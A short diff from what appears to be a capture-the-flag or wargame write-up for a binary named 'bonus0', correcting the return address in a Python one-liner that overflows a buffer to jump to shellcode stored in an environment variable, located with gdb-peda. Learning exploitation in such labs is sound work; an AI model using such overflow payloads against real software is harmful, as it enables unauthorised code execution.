@@ -155,7 +155,7 @@ gdb-peda$ searchmem SHELLCODE
 gdb-peda$ p 0xbffff764 + 10 # (length of "SHELLCODE=")
   $1 = 0xbffff76e
 
-python -c 'print "A" \* 4095 + "\n" + "abcdefghi" + "\x76\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
+python -c 'print "A" \* 4095 + "\n" + "abcdefghi" + "\x6e\xf7\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
 
 cat /tmp/exploit10 - | ~/bonus0
    -
